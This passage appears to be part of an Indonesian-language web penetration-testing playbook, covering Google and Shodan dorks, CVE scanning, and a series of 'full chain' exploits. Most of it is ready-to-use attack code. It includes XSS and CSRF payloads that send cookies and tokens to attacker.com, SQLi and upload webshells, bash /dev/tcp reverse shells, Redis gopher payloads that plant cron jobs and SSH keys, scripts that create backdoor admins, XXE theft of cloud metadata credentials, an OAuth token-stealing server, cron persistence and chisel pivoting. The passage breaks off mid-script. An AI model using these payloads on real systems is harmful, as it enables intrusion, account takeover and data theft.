intext:"Powered by WordPress 4." | intext:"WordPress 5.0"

# Shodan — software lama
"Apache/2.4.49" port:80
"PHP/5.6" port:80
"nginx/1.14" port:80
"Server: Microsoft-IIS/7.5" port:80
"X-Powered-By: ASP.NET" "Server: Microsoft-IIS/8.0"

# Nuclei
nuclei -u https://target.com -tags cve,outdated
```

## Cara Kerja
Aplikasi modern menggunakan ratusan library pihak ketiga. Jika salah satu memiliki CVE (known vulnerability), attacker bisa exploit tanpa menemukan bug baru. Deteksi dilakukan dengan scanning dependencies terhadap database CVE.

## Langkah

```bash
# ===== STEP 1: Identifikasi teknologi =====
# Cek response headers
curl -I https://lab.com
# Server: Apache/2.4.49    # 🚨 CVE-2021-41773 path traversal!
# X-Powered-By: PHP/7.3.0  # 🚨 EOL, banyak CVE!
# ✅ Jika versi lama terlihat → cari CVE di NVD/exploit-db

# ===== STEP 2: Scan dependencies =====
# Node.js
npm audit
# ✅ Output: "found 5 vulnerabilities (2 critical, 3 high)"
npx audit-ci --critical

# Python
pip-audit
# ✅ Output: "Found 3 known vulnerabilities in 2 packages"
safety check -r requirements.txt

# Java
mvn dependency-check:check
# ✅ Report HTML dengan CVE details

# ===== STEP 3: JS library check =====
retire --path /path/to/project
# ✅ Deteksi jQuery 1.x, lodash lama, dll

# ===== STEP 4: CVE scanning =====
nuclei -u https://lab.com -tags cve
# ✅ Output: CVE-2021-41773, CVE-2021-44228, dll

snyk test
# ✅ Detailed vulnerability info + fix version

# ===== STEP 5: SBOM + vuln matching =====
syft /path/to/project -o json > sbom.json
grype sbom.json
# ✅ Full dependency tree + matched CVEs
```

## Analisis Response
| Tool Output | Artinya |
|-------------|--------|
| `Critical: lodash < 4.17.21` | Prototype Pollution CVE → exploit available |
| `Apache/2.4.49` | CVE-2021-41773 path traversal → file read |
| `PHP/7.x EOL` | Banyak unpatched CVE |
| `0 vulnerabilities found` | Dependencies up to date |
| `${jndi:ldap://...}` works | Log4Shell (CVE-2021-44228) → RCE! |

## Bukti
- Dependency dengan CVE teridentifikasi
- Screenshot `npm audit` atau `pip-audit` dengan finding
- CVE exploit berhasil dijalankan di lab

---

# 19. Logging Failure Attack Simulation

**Kategori**: Logging & Monitoring Failure | **OWASP**: A09  
**Tujuan**: Aksi penting tidak tercatat di log audit

## Dork
```
# Google Dork — cari log/monitoring terbuka
inurl:"/logs/" | inurl:"/log/" | inurl:"access.log" | inurl:"error.log"
intitle:"Index of /logs" | intitle:"Index of /log"
inurl:"kibana" | inurl:"grafana" | inurl:"graylog"
inurl:"/status" | inurl:"/health" | inurl:"/metrics"
inurl:"phpMyAdmin" inurl:"log"  # DB logs

# Shodan — monitoring tools terbuka
http.title:"Kibana" port:5601
http.title:"Grafana" port:3000
http.title:"Graylog" port:9000
"Elastic" port:9200
```

## Cara Kerja
Logging failure terjadi ketika server tidak mencatat event keamanan penting: brute force login, akses unauthorized, perubahan data sensitif, atau download massal. Tanpa logging, serangan tidak terdeteksi dan forensik tidak bisa dilakukan. Pengujian dilakukan dengan melakukan aksi berbahaya lalu memeriksa apakah tercatat.

## Langkah

```bash
# ===== STEP 1: Brute force login (50+ attempt) =====
hydra -l admin -P passwords.txt lab.com http-post-form "/login:u=^USER^&p=^PASS^:Invalid"
# Lalu cek: ada alert/log?
# ✅ Jika ada notif ke admin/SOC → monitoring OK
# ❌ Jika tidak ada log → LOGGING FAILURE!

# ===== STEP 2: Access admin endpoint tanpa izin =====
GET /admin/users
Authorization: Bearer REGULAR_USER_TOKEN
# Cek di audit log: tercatat?
# ✅ Jika ada entry: "[WARN] Unauthorized access to /admin/users by user:1001" → OK
# ❌ Jika tidak ada log → FAILURE

# ===== STEP 3: Ubah data sensitif =====
POST /api/change-password {"new":"hacked123"}
# Cek: ada log perubahan password?
# ✅ Jika ada: "[INFO] Password changed for user:1001 from IP:x.x.x.x" → OK
# ❌ Jika tidak ada → FAILURE

# ===== STEP 4: Download bulk data =====
GET /api/export/all-users
# Cek: ada log download massal?
# ✅ Jika ada: "[WARN] Bulk export triggered by user:1001" → OK
# ❌ Jika tidak ada → FAILURE

# ===== STEP 5: Login dari IP anomali =====
# Coba login dari VPN/proxy berbeda
# Cek: ada alert anomaly?
# ✅ Jika ada: "[ALERT] Login from unusual IP for user:admin" → OK
# ❌ Jika tidak ada → FAILURE

# ===== STEP 6: Verifikasi di server =====
cat /var/log/app/audit.log | grep "login_failed"
# ❌ Jika kosong → brute force tidak di-log!

cat /var/log/app/audit.log | grep "password_change"
# ❌ Jika kosong → perubahan sensitif tidak di-log!

cat /var/log/app/audit.log | grep "export\|download"
# ❌ Jika kosong → bulk download tidak di-log!

# Cek apakah ada alerting system
cat /var/log/app/alerts.log
# ❌ Jika file tidak ada → tidak ada alerting sama sekali!
```

## Analisis Response
| Aksi | Expected Log | Jika Tidak Ada |
|------|-------------|----------------|
| 50x login failed | `[WARN] Brute force detected from IP:x.x.x.x` | Brute force tidak terdeteksi |
| Unauthorized admin access | `[WARN] Unauthorized access attempt` | Intruder bisa scan tanpa terdeteksi |
| Password change | `[INFO] Credential changed for user:X` | Perubahan kredensial tanpa jejak |
| Bulk data export | `[WARN] Mass data export triggered` | Data exfiltration tanpa alert |
| Login from new IP | `[ALERT] Anomalous login pattern` | Account takeover tanpa notifikasi |

## Bukti
- Tidak ada log untuk brute force attempt
- Aksi kritis (ubah password, download data) tidak tercatat
- File audit.log kosong atau tidak ada entry keamanan

---

# 20. Full Active Attack Chain

**Kategori**: Multi-category | **OWASP**: Multiple  
**Tujuan**: Menggabungkan beberapa celah dari awal sampai impact

## Dork
```
# Google Dork — recon untuk full chain attack
site:target.com filetype:sql | filetype:env | filetype:log | filetype:bak
site:target.com inurl:"api" | inurl:"admin" | inurl:"debug"
site:target.com ext:php | ext:asp | ext:jsp inurl:"id="
"robots.txt" site:target.com
"sitemap.xml" site:target.com
site:target.com intitle:"Index of" | intitle:"Directory listing"
site:target.com intext:"error" | intext:"exception" | intext:"stack trace"

# Shodan — comprehensive recon
hostname:"target.com" port:80,443,8080,8443
ssl.cert.subject.cn:"target.com"
http.favicon.hash:HASH_VALUE  # Favicon hash untuk identify tech

# Nuclei — full scan
nuclei -u https://target.com -severity critical,high
nuclei -u https://target.com -tags cve,sqli,xss,ssrf,rce
```

## Cara Kerja
Pada real-world pentest, jarang satu vulnerability langsung memberikan impact kritis. Biasanya attacker **menggabungkan** beberapa kelemahan (chain) dari recon hingga full compromise. Setiap langkah memanfaatkan output langkah sebelumnya sebagai input. Section ini mengajarkan cara berpikir seperti attacker: menghubungkan temuan menjadi skenario serangan lengkap.

## Contoh Chain

```
Chain 1: Recon → SQLi → Admin Takeover
──────────────────────────────────────
Step 1: [Recon] robots.txt → /api/v1/internal
  → Response 200 OK → endpoint terbuka
Step 2: [Info Disclosure] /api/v1/internal → error with DB name
  → Response: "SQLSTATE: table 'webapp_db.users' doesn't exist"
  → Dapat: nama database = webapp_db, tabel = users
Step 3: [SQLi] Parameter id vulnerable → dump users table
  → GET /products?id=-1 UNION SELECT username,password FROM users--
  → Response: admin:$2b$12$...
Step 4: [Auth] Login as admin with extracted credentials
  → Crack hash → hashcat -m 3200 hash.txt rockyou.txt
  → Password: Admin@123
Step 5: [Impact] Full admin access, data exfiltration
  → Login → 302 redirect ke /admin/dashboard
  ✅ FULL CHAIN COMPLETE

Chain 2: XSS → Session Hijack → Account Takeover
─────────────────────────────────────────────────
Step 1: [Stored XSS] Inject payload di comment field
  → <script>new Image().src='https://attacker.com/c='+document.cookie</script>
  → Response 200 OK → payload tersimpan
Step 2: [Cookie Steal] XSS mengirim cookie ke attacker server
  → Korban buka halaman → cookie muncul di attacker log
  → Dapat: session_id=abc123xyz
Step 3: [Session Hijack] Login dengan stolen cookie
  → curl -H "Cookie: session_id=abc123xyz" https://lab.com/profile
  → Response: data korban terlihat
Step 4: [Impact] Akses penuh ke akun korban, ubah email/password
  → POST /api/change-email {"email":"attacker@evil.com"}
  ✅ FULL CHAIN COMPLETE

Chain 3: SSRF → Internal Service → RCE
───────────────────────────────────────
Step 1: [SSRF] Parameter url fetch internal Redis
  → POST /api/fetch {"url":"http://127.0.0.1:6379"}
  → Response: "+PONG" → Redis terbuka!
Step 2: [Redis] Write SSH key via SSRF
  → SSRF ke Redis: SET ssh_key "ssh-rsa AAAA..." 
  → CONFIG SET dir /root/.ssh
  → CONFIG SET dbfilename authorized_keys
  → SAVE
Step 3: [RCE] SSH ke server dengan key yang ditulis
  → ssh -i attacker_key root@target
  → Response: root@server:~# → ROOT ACCESS!
Step 4: [Impact] Full server access
  ✅ FULL CHAIN COMPLETE

Chain 4: IDOR → Enumeration → Mass Data Leak
─────────────────────────────────────────────
Step 1: [IDOR] /api/users/1001 → data user lain terlihat
  → Response: {"id":1001,"name":"Jane","email":"jane@test.com"}
  → IDOR confirmed!
Step 2: [Enum] Iterate ID 1-10000 → dump semua user
  → Script Python: 8,500 profil berhasil di-dump
Step 3: [Info Exposure] API return password_hash, PII
  → Data: email, phone, address, password_hash
Step 4: [Impact] Mass data breach simulation
  → Crack password hashes → credential stuffing
  ✅ FULL CHAIN COMPLETE
```

## Template Dokumentasi Chain

```markdown
# Attack Chain Report

## Executive Summary
- **Chain**: [Nama chain]
- **Severity**: Critical/High/Medium
- **Impact**: [Deskripsi impact]

## Steps
| Step | Vulnerability | Input | Output |
|------|--------------|-------|--------|
| 1 | Recon (robots.txt) | GET /robots.txt | /api/internal found |
| 2 | Info Disclosure | GET /api/internal | DB error with version |
| 3 | SQLi | id=1' UNION... | Admin credentials |
| 4 | Auth bypass | Login as admin | Full dashboard access |

## Evidence
- Screenshot per step
- Request/response dari Burp
- Timeline

## Remediation
- Step 1: Fix [vuln 1]
- Step 2: Fix [vuln 2]
- Step 3: Fix [vuln 3]
```

## Bukti
- Dokumentasi lengkap dari step awal hingga impact
- Screenshot + Burp log per step
- Timeline attack chain

---

# 🔗 ADVANCED FULL CHAIN EXPLOITS

> **Catatan**: Bagian berikut mendemonstrasikan full exploit chain dari initial access hingga impact. Setiap chain berisi payload lengkap yang siap digunakan di lab.

---

# 21. CSRF → Stored XSS → Account Takeover (Full Chain)

**Kategori**: 🔗 Full Chain | **OWASP**: A01 + A03 + A07  
**Tujuan**: CSRF menyimpan XSS → XSS mencuri session → attacker takeover akun

## Full Exploit

```html
<!-- ===== STEP 1: CSRF menyimpan XSS payload di profil korban ===== -->
<!-- Kirim halaman ini ke korban (phishing link) -->
<html><body>
<h1>🎁 Congratulations! Click to claim your reward</h1>
<iframe style="display:none" name="csrf"></iframe>

<!-- CSRF 1: Simpan XSS di bio -->
<form action="https://target.com/api/update-profile" method="POST" target="csrf" id="f1">
  <input type="hidden" name="bio" value="<script>
    // STEP 2: XSS payload - steal cookie + create backdoor admin
    fetch('/api/user/me').then(r=>r.json()).then(u=>{
      // Exfil semua data
      fetch('https://attacker.com/steal',{method:'POST',body:JSON.stringify({
        cookie: document.cookie,
        user: u,
        localStorage: JSON.stringify(localStorage),
        url: location.href
      })});
      // Change email ke attacker (untuk password reset nanti)
      fetch('/api/change-email',{method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({email:'attacker@evil.com'})
      });
    });
  </script>">
</form>

<script>
  // Auto-submit
  document.getElementById('f1').submit();
  
  // STEP 3: Redirect korban ke halaman profil (trigger XSS)
  setTimeout(function(){
    window.location = 'https://target.com/profile';
  }, 1000);
</script>
</body></html>
```

```bash
# ===== STEP 4: Di server attacker =====
# Terima stolen data
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        data = json.loads(self.rfile.read(int(self.headers['Content-Length'])))
        print(f'=== ACCOUNT TAKEOVER ===')
        print(f'Cookie: {data.get(\"cookie\")}')
        print(f'User: {json.dumps(data.get(\"user\"), indent=2)}')
        self.send_response(200); self.end_headers()
HTTPServer(('0.0.0.0',443), H).serve_forever()
"

# STEP 5: Login dengan stolen cookie
curl -b "session=STOLEN_SESSION" https://target.com/api/user/me
# STEP 6: Atau request password reset ke email yang sudah diubah
curl -X POST https://target.com/api/forgot-password -d '{"email":"attacker@evil.com"}'
```

## Bukti
- CSRF berhasil menyimpan XSS di profil
- Cookie + data user muncul di server attacker
- Email berubah ke attacker → password reset → full takeover

---

# 22. SQLi → Webshell → Reverse Shell (Full Chain)

**Kategori**: 🔗 Full Chain | **OWASP**: A03  
**Tujuan**: Dari SQLi biasa → tulis webshell → dapat interactive shell

## Full Exploit

```bash
# ===== STEP 1: Confirm SQLi =====
GET /products?id=1' AND 1=1-- -    # normal page
GET /products?id=1' AND 1=2-- -    # different/empty → SQLi confirmed

# ===== STEP 2: Enumerate database =====
sqlmap -u "https://target.com/products?id=1" --batch --dbs
# Database: webapp_db

sqlmap -u "https://target.com/products?id=1" --batch -D webapp_db --tables
# Tables: users, products, sessions

sqlmap -u "https://target.com/products?id=1" --batch -D webapp_db -T users --dump
# admin:$2b$12$hash... → crack with hashcat

# ===== STEP 3: Find web root =====
# Via error message atau LOAD_FILE
GET /products?id=-1' UNION SELECT 1,LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'),3-- -
GET /products?id=-1' UNION SELECT 1,LOAD_FILE('/etc/nginx/nginx.conf'),3-- -
# DocumentRoot: /var/www/html

# ===== STEP 4: Write webshell via SQLi =====
GET /products?id=-1' UNION SELECT '<?php if(isset($_REQUEST["cmd"])){echo "<pre>";system($_REQUEST["cmd"]);echo "</pre>";}?>',2,3 INTO OUTFILE '/var/www/html/uploads/.shell.php'-- -

# Atau via SQLMap
sqlmap -u "https://target.com/products?id=1" --file-write="shell.php" --file-dest="/var/www/html/uploads/.shell.php"

# ===== STEP 5: Verify webshell =====
curl "https://target.com/uploads/.shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data)

curl "https://target.com/uploads/.shell.php?cmd=whoami"
# www-data

# ===== STEP 6: Upgrade to reverse shell =====
# Encode reverse shell payload
REV_SHELL=$(echo -n "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" | base64)

# Trigger via webshell
curl "https://target.com/uploads/.shell.php?cmd=echo+${REV_SHELL}|base64+-d|bash"

# ===== STEP 7: Pada attacker machine =====
nc -lvnp 4444
# Connection received!

# Upgrade shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z → stty raw -echo; fg

# ===== STEP 8: Post-exploitation =====
whoami          # www-data
cat /etc/passwd
sudo -l         # check sudo permissions
find / -perm -4000 2>/dev/null  # SUID binaries
cat /var/www/html/config.php    # database credentials
```

## Bukti
- SQLi confirmed → database dumped
- Webshell written dan accessible
- Reverse shell didapat → interactive access
- Post-exploitation data terkumpul

---

# 23. SSRF → Redis → RCE (Full Chain)

**Kategori**: 🔗 Full Chain | **OWASP**: A10  
**Tujuan**: SSRF mengakses Redis internal → tulis cron/SSH key → RCE

## Full Exploit

```bash
# ===== STEP 1: Confirm SSRF =====
POST /api/fetch {"url":"http://attacker.com/ping"}
# Request muncul di server attacker → SSRF confirmed

# ===== STEP 2: Scan internal services via SSRF =====
POST /api/fetch {"url":"http://127.0.0.1:6379"}  # Redis → CONNECTED
POST /api/fetch {"url":"http://127.0.0.1:3306"}  # MySQL
POST /api/fetch {"url":"http://127.0.0.1:27017"} # MongoDB

# ===== STEP 3: Redis RCE via Cron (Linux) =====
# Gopher protocol untuk kirim command ke Redis
POST /api/fetch {"url":"gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a"}

# ===== STEP 4: Redis RCE via SSH Key =====
# Generate SSH key
ssh-keygen -t rsa -f /tmp/redis_rsa -N ""
PUBKEY=$(cat /tmp/redis_rsa.pub)

# Write SSH key via Redis
POST /api/fetch {"url":"gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$SIZE%0d%0a%0a%0aPUBKEY_HERE%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a"}

# ===== STEP 5: SSH sebagai root =====
ssh -i /tmp/redis_rsa root@target.com
# root@target:~#
```

```python
# Tool: Generate Gopher payload untuk Redis
import urllib.parse

def gen_redis_gopher(cmds):
    payload = ""
    for cmd in cmds:
        parts = cmd.split()
        payload += f"*{len(parts)}\r\n"
        for p in parts:
            payload += f"${len(p)}\r\n{p}\r\n"
    return "gopher://127.0.0.1:6379/_" + urllib.parse.quote(payload)

commands = [
    "flushall",
    'set 1 "\\n\\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1\\n\\n"',
    "config set dir /var/spool/cron/",
    "config set dbfilename root",
    "save"
]
print(gen_redis_gopher(commands))
```

## Bukti
- SSRF mengakses Redis tanpa auth
- Cron job / SSH key berhasil ditulis
- Root shell didapat via SSH atau cron reverse shell

---

# 24. XSS → Admin Panel → Privilege Escalation (Full Chain)

**Kategori**: 🔗 Full Chain | **OWASP**: A03 + A01  
**Tujuan**: XSS di user area → steal admin session → escalate ke admin

## Full Exploit

```javascript
// ===== STEP 1: Stored XSS payload yang menarget admin =====
// Simpan di komentar/support ticket yang akan dibaca admin

<script>
(async function(){
  // Step 2: Cek apakah viewer adalah admin
  let me = await fetch('/api/user/me').then(r=>r.json());
  
  if(me.role === 'admin' || me.is_admin) {
    // === ADMIN DETECTED! ===
    
    // Step 3: Steal admin session
    let adminData = {
      cookie: document.cookie,
      token: localStorage.getItem('token'),
      user: me,
      adminUrl: location.href
    };
    
    // Step 4: Exfil admin data
    navigator.sendBeacon('https://attacker.com/admin-steal', JSON.stringify(adminData));
    
    // Step 5: Create backdoor admin account
    let csrf = document.querySelector('meta[name="csrf-token"]')?.content || '';
    
    await fetch('/admin/api/users/create', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrf
      },
      body: JSON.stringify({
        username: 'support_backup',
        email: 'support@target.com',
        password: 'Backdoor!2026',
        role: 'admin',
        active: true
      })
    });
    
    // Step 6: Disable security settings
    await fetch('/admin/api/settings', {
      method: 'PATCH',
      headers: {'Content-Type': 'application/json', 'X-CSRF-Token': csrf},
      body: JSON.stringify({
        two_factor_required: false,
        password_complexity: 'low',
        session_timeout: 999999
      })
    });
    
    // Step 7: Download semua user data
    let users = await fetch('/admin/api/users/export?format=json').then(r=>r.text());
    navigator.sendBeacon('https://attacker.com/data-dump', users);
  }
})();
</script>
```

```bash
# ===== Di attacker server =====
# Terima admin session + data dump
python3 -m http.server 443 --bind 0.0.0.0

# Login dengan backdoor account yang dibuat
curl -X POST https://target.com/login \
  -d '{"username":"support_backup","password":"Backdoor!2026"}' \
  -H "Content-Type: application/json"
```

## Bukti
- Admin session berhasil dicuri via XSS
- Backdoor admin account terbuat
- Semua user data ter-exfiltrate
- Full admin access tercapai

---

# 25. XXE → SSRF → Cloud Credential Theft (Full Chain)

**Kategori**: 🔗 Full Chain | **OWASP**: A05 + A10  
**Tujuan**: XXE pada XML parser → SSRF ke metadata → curi AWS/GCP credentials

## Full Exploit

```xml
<!-- ===== STEP 1: Confirm XXE ===== -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe "XXE_WORKS">
]>
<data>&xxe;</data>
<!-- Response: "XXE_WORKS" → XXE confirmed -->

<!-- ===== STEP 2: Read local files ===== -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

<!-- ===== STEP 3: XXE → SSRF ke AWS metadata ===== -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<data>&xxe;</data>
<!-- Response: "webapp-role" -->

<!-- ===== STEP 4: Get actual credentials ===== -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-role">
]>
<data>&xxe;</data>
<!-- Response: AccessKeyId, SecretAccessKey, Token -->

<!-- ===== STEP 5: GCP Service Account ===== -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token">
]>
<data>&xxe;</data>
```

```bash
# ===== STEP 6: Gunakan stolen AWS credentials =====
export AWS_ACCESS_KEY_ID="STOLEN_KEY_ID"
export AWS_SECRET_ACCESS_KEY="STOLEN_SECRET"
export AWS_SESSION_TOKEN="STOLEN_TOKEN"

# Enumerate resources
aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances
aws iam list-users
aws secretsmanager list-secrets

# Download S3 data
aws s3 sync s3://internal-bucket ./stolen-data/

# Read secrets
aws secretsmanager get-secret-value --secret-id prod/database
```

## Bukti
- XXE membaca file lokal
- AWS/GCP credentials muncul via metadata SSRF
- Berhasil akses cloud resources dengan credentials curian

---

# 26. Open Redirect → OAuth → Account Takeover (Full Chain)

**Kategori**: 🔗 Full Chain | **OWASP**: A01 + A07  
**Tujuan**: Open redirect mencuri OAuth token → takeover akun korban

## Full Exploit

```bash
# ===== STEP 1: Temukan open redirect =====
GET /login?next=https://attacker.com
# 302 → https://attacker.com → Open redirect confirmed!

# ===== STEP 2: Buat OAuth authorization URL dengan redirect_uri yang dimanipulasi =====
# Normal OAuth flow:
https://target.com/oauth/authorize?client_id=APP_ID&redirect_uri=https://target.com/callback&response_type=token&scope=profile

# Attack: chain open redirect sebagai redirect_uri
https://target.com/oauth/authorize?client_id=APP_ID&redirect_uri=https://target.com/login?next=https://attacker.com/steal&response_type=token&scope=profile+email

# ===== STEP 3: Kirim link ke korban (phishing) =====
# Korban klik → OAuth authorize → redirect ke target.com/login?next=... → redirect ke attacker.com/steal#access_token=TOKEN
```

```python
# ===== STEP 4: Server attacker menangkap token =====
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse, json, requests

class OAuthStealer(BaseHTTPRequestHandler):
    def do_GET(self):
        # Token ada di fragment (#), perlu JS untuk capture
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b'''
        <script>
        // Capture token dari URL fragment
        var hash = window.location.hash.substring(1);
        var params = new URLSearchParams(hash);
        var token = params.get('access_token');
        
        if(token) {
            // Kirim ke backend attacker
            fetch('/capture?token=' + token);
            
            // Redirect korban balik ke target (stealth)
            window.location = 'https://target.com/dashboard';
        }
        </script>
        <p>Loading...</p>
        ''')
    
        # Capture token dari query param
        if 'token=' in self.path:
            token = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query).get('token',[''])[0]
            if token:
                print(f"\n[!!!] STOLEN TOKEN: {token}\n")
                # Step 5: Use token
                r = requests.get('https://target.com/api/user/me',
                    headers={'Authorization': f'Bearer {token}'})
                print(f"[*] User data: {r.json()}")

HTTPServer(('0.0.0.0', 80), OAuthStealer).serve_forever()
```

```bash
# ===== STEP 6: Gunakan token untuk takeover =====
# Get user info
curl -H "Authorization: Bearer STOLEN_TOKEN" https://target.com/api/user/me

# Change email
curl -X POST https://target.com/api/change-email \
  -H "Authorization: Bearer STOLEN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}'

# Request password reset ke email baru
curl -X POST https://target.com/api/forgot-password \
  -d '{"email":"attacker@evil.com"}'
```

## Bukti
- Open redirect → OAuth flow hijacked
- Access token muncul di server attacker
- Account korban berhasil diambil alih

---

# 27. SSTI → RCE → Post-Exploitation (Full Chain)

**Kategori**: 🔗 Full Chain | **OWASP**: A03  
**Tujuan**: Template injection → command execution → full server compromise

## Full Exploit

```bash
# ===== STEP 1: Detect SSTI =====
GET /page?name={{7*7}}         # Response: 49 → SSTI!
GET /page?name={{7*'7'}}       # Response: 7777777 → Jinja2 confirmed
GET /page?name={{config}}      # Dump Flask config

# ===== STEP 2: Enumerate Python environment =====
GET /page?name={{request.application.__globals__.__builtins__}}
GET /page?name={{config['SECRET_KEY']}}
GET /page?name={{request.environ}}

# ===== STEP 3: RCE via Jinja2 =====
# Method 1: Direct os.popen
GET /page?name={{lipsum.__globals__['os'].popen('id').read()}}

# Method 2: Import module
GET /page?name={{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}

# Method 3: Subclass enumeration
GET /page?name={{''.__class__.__mro__[1].__subclasses__()}}
# Find subprocess.Popen index (e.g., 407)
GET /page?name={{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()[0]}}

# ===== STEP 4: Reverse shell via SSTI =====
GET /page?name={{lipsum.__globals__['os'].popen('bash -c "bash -i >%26 /dev/tcp/ATTACKER_IP/4444 0>%261"').read()}}

# URL encoded version
GET /page?name=%7B%7Blipsum.__globals__%5B'os'%5D.popen('bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER%2F4444%200%3E%261%22').read()%7D%7D
```

```bash
# ===== STEP 5: Post-exploitation (setelah dapat shell) =====
# System enumeration
uname -a
cat /etc/os-release
whoami && id
sudo -l
cat /etc/crontab

# Find credentials
grep -r "password" /var/www/ --include="*.py" --include="*.conf" --include="*.env" 2>/dev/null
cat /var/www/app/.env
cat /var/www/app/config.py

# Database access
# Dari config: DB_URI=postgresql://user:pass@localhost/webapp
psql -h localhost -U user -d webapp -c "SELECT * FROM users LIMIT 5;"

# Privilege escalation
find / -perm -4000 -type f 2>/dev/null  # SUID
find / -writable -type f 2>/dev/null     # Writable files
cat /etc/sudoers 2>/dev/null

# Persistence
echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER/4445 0>&1'" >> /var/spool/cron/crontabs/www-data
```

## Bukti
- SSTI confirmed ({{7*7}} = 49)
- RCE achieved (id, whoami output)
- Reverse shell + post-exploitation berhasil

---

# 28. File Upload → Pivot → Lateral Movement (Full Chain)

**Kategori**: 🔗 Full Chain | **OWASP**: A05 + A03  
**Tujuan**: Upload webshell → enumerate internal network → pivot ke server lain

## Full Exploit

```bash
# ===== STEP 1: Upload webshell (bypass filters) =====
# Create polyglot webshell (valid image + PHP)
printf 'GIF89a<?php if(isset($_REQUEST["c"])){echo "<pre>";passthru($_REQUEST["c"]);echo "</pre>";}?>' > avatar.gif.php

# Upload with MIME bypass
curl -F "avatar=@avatar.gif.php;type=image/gif" \
  -H "Cookie: session=USER_SESSION" \
  https://target.com/api/upload-avatar

# ===== STEP 2: Verify webshell =====
curl "https://target.com/uploads/avatars/avatar.gif.php?c=id"
# uid=33(www-data)

# ===== STEP 3: Internal network enumeration =====
# Discover network
curl "https://target.com/uploads/avatars/avatar.gif.php?c=ifconfig"
curl "https://target.com/uploads/avatars/avatar.gif.php?c=ip+addr"
curl "https://target.com/uploads/avatars/avatar.gif.php?c=cat+/etc/hosts"
curl "https://target.com/uploads/avatars/avatar.gif.php?c=arp+-a"

# Internal port scan
curl "https://target.com/uploads/avatars/avatar.gif.php?c=for+i+in+$(seq+1+255);do+(echo+>/dev/tcp/192.168.1.$i/80)+2>/dev/null+%26%26+echo+192.168.1.$i:80;done"

# ===== STEP 4: Access internal services =====
# Internal database
curl "https://target.com/uploads/avatars/avatar.gif.php?c=mysql+-h+192.168.1.10+-u+root+-pPASSWORD+-e+'SELECT+*+FROM+users+LIMIT+5'+webapp"

# Internal Redis
curl "https://target.com/uploads/avatars/avatar.gif.php?c=redis-cli+-h+192.168.1.11+INFO"

# Internal API
curl "https://target.com/uploads/avatars/avatar.gif.php?c=curl+http://192.168.1.20:8080/admin/users"

# ===== STEP 5: Pivot via reverse shell =====
# Upload chisel/ligolo for tunneling
curl "https://target.com/uploads/avatars/avatar.gif.php?c=curl+http://ATTACKER/chisel+-o+/tmp/chisel+%26%26+chmod+%2bx+/tmp/chisel"

# Start reverse tunnel
# Attacker: ./chisel server -p 8080 --reverse
curl "https://target.com/uploads/avatars/avatar.gif.php?c=/tmp/chisel+client+ATTACKER:8080+R:socks"

# ===== STEP 6: Access internal network via proxy =====
# Pada attacker machine, gunakan SOCKS proxy
proxychains nmap -sT 192.168.1.0/24 -p 22,80,443,3306,6379
proxychains ssh root@192.168.1.10
proxychains curl http://192.168.1.20:8080/admin
```

## Bukti
- Webshell berhasil diupload dan dieksekusi
- Internal network ter-enumerate
- Pivot ke server internal berhasil
- Lateral movement tercapai via tunneling

---

# 29. IDOR → Data Leak → Credential Stuffing (Full Chain)

**Kategori**: 🔗 Full Chain | **OWASP**: A01 + A07  
**Tujuan**: IDOR untuk dump data massal → extract credentials → login ke akun lain

## Full Exploit

```python
# ===== STEP 1: Confirm IDOR =====
import requests

headers = {"Authorization": "Bearer MY_USER_TOKEN"}

# Akses data user lain
r1 = requests.get("https://target.com/api/users/1001/profile", headers=headers)  # My profile
r2 = requests.get("https://target.com/api/users/1002/profile", headers=headers)  # Other user!
# Jika r2.status_code == 200 → IDOR confirmed

# ===== STEP 2: Mass enumeration =====
